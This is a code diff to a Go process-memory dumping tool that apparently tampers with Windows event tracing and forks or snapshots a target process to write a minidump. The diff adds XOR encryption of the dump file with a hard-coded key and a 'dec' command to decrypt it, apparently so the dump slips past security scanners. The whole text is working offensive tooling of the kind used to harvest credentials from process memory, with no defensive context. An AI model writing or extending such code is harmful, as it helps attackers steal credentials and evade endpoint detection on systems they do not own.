@@ -99,7 +99,40 @@ func str2sha1(s string) string {
 	return fmt.Sprintf("%x", bs)
 }
 
+var XorKey []byte = []byte{0x11, 0x34, 0x67, 0x6A, 0xAA, 0xFF, 0x04, 0x7B}
+
+type Xor struct {
+}
+
+func (a *Xor) enc(src []byte) []byte {
+	var result []byte
+	j := 0
+	for i := 0; i < len(src); i++ {
+		s := src[i] ^ XorKey[j]
+		result = append(result, s)
+		j = (j + 1) % 8
+	}
+	return result
+}
+
 func main() {
+	if len(os.Args) < 2 {
+		return
+	}
+	xor := Xor{}
+	if len(os.Args) == 3 && os.Args[1] == "dec" {
+		res, _ := ioutil.ReadFile(os.Args[2])
+		dump := xor.enc(res)
+
+		filen := strconv.Itoa(int(time.Now().UnixMilli())) + ".dmp"
+		if dump != nil {
+			ioutil.WriteFile(filen, dump, 0644)
+			fmt.Println("decode Success" + filen)
+			return
+		}
+		return
+	}
+
 	ByETW()
 	pid, _ := strconv.Atoi(os.Args[1])
 
@@ -211,10 +244,10 @@ func main() {
 
 	//Read and Fork End
 	dump, _ := minidump(uint32(fpid), windows.Handle(currentSnapshotProcess))
-
 	filen := strconv.Itoa(int(time.Now().UnixMilli())) + ".dmp"
 	if dump != nil {
-		ioutil.WriteFile(filen, dump, 0644)
+		dumpxor := xor.enc(dump)
+		ioutil.WriteFile(filen, dumpxor, 0644)
 	}
 	fmt.Println("dump Success" + filen)
 
